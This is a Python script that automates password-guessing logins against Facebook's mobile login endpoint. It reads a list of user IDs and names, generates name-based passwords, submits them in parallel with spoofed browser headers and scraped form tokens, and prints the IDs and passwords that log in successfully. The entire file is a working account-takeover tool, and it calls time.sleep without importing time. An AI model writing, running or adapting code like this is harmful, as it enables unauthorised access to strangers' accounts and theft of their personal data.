import requests,os,json,sys,random,uuid,re
from concurrent.futures import ThreadPoolExecutor as lol
from requests.exceptions import ConnectionError as CError
from bs4 import BeautifulSoup as parser
teer = ("|");idx = [];loop = 0;take_file = []
new_file = [];passwords = [];proxer = [];oku = []
cpu = [];tfu = []
G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
C = '\x1b[0m' 

idx = []
p_ = ['first last','First Last','firstlast','first123','first1234','first12345','first786','First12','First123','First1234','First12345']
oku = []
cpu = []
loop = 1

def menu():
    os.system('clear')
    file = input("file: ")
    for x in open(file,'r').readlines():
        idx.append(x.strip())
    print(47*'-')
    print('\t wait we are cracking ids .....')
    print(47*'-')
    with lol (max_workers=30) as send:
        for ids in idx:
            uid , nam = ids.rsplit("|")
            f = nam.rsplit(' ')[0]
            try:
                l = nam.rsplit(' ')[0]
            except(IOError,OSError,KeyError):
                l = f
            send.submit(check, uid,f,l)
    print(47*'-')
    print('cloning end use python filecloner.py relogin')
    print(47*'-')
    exit()
def check(uid,f,l):
    global loop,cpu,oku
    sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
    ses = requests.Session()
    url = "mbasic.facebook.com"
    for pw in p_:
        try:
            pw = pw.replace('first',f).replace('last',l).replace('First',f.capitalize()).replace('Last',l.capitalize())
            #uid = ("100075519436264")
            #pw = ("khan1122")
            pw = pw.lower()
            p = ses.get("https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(url,uid),headers={
                'Host':url,
                'Connection':'keep-alive',
                'Cache-Control'	:'max-age=0',
		    	'sec-ch-ua'	:'" Not A;Brand";v="99", "Chromium";v="101"',
		    	'sec-ch-ua-mobile':'?1',
	    		'sec-ch-ua-platform':'"Android"',
		    	'Upgrade-Insecure-Requests':'1',
		    	'User-Agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
		    	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		    	'Sec-Fetch-Site':'same-origin',
		    	'Sec-Fetch-Mode':'navigate',
		    	'Sec-Fetch-User':'?1',
		    	'Sec-Fetch-Dest':'document',
		    	'Referer':f'https://{url}/login/device-based/',
		    	'Accept-Encoding':'gzip, deflate',
		    	'Accept-Language':'en-us'}).text
            b=parser(p,"html.parser")
            _po_ = b.find("form",method="post").get("action")
            data = {_.get('name'):_.get('value') for _ in b.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
            data.update(
                {'uid':uid,'next':f'https://{url}/login/save-device/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(1111111111,9999999999),pw),'submit':'Log in'})
            x = ses.post("https://{}{}".format(url,_po_),data=data,headers = {
		        'Host':url,
		        'Connection':'keep-alive',
		        'Content-Length':'142',
		        'Cache-Control':'max-age=0',
                'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile':'?1',
                'sec-ch-ua-platform':'"Android"',
                'Upgrade-Insecure-Requests':'1',
                'Origin':url,
                'Content-Type':'application/x-www-form-urlencoded',
                'User-Agent':"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site':'same-origin',
                'Sec-Fetch-Mode':'navigate',
                'Sec-Fetch-User':'?1',
                'Sec-Fetch-Dest':'document',
                'Referer':"https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(url,uid),
                'Accept-Encoding':'gzip, deflate, br',
                'Accept-Language':'en-us'},allow_redirects=False)
            if 'c_user' in (ses.cookies.get_dict()):
                print("\r {} [Successful-PRO] {} {} {} {}".format(G,uid,teer,pw,C))
                oku.append(uid)
                break
            elif 'checkpoint' in (ses.cookies.get_dict()):
                print("\r {} [Checkpoint-PRO] {} {} {} {}".format(R,uid,teer,pw,C))
                break
            else:
                continue
        except(CError):
            time.sleep(10)
    loop+=1
menu()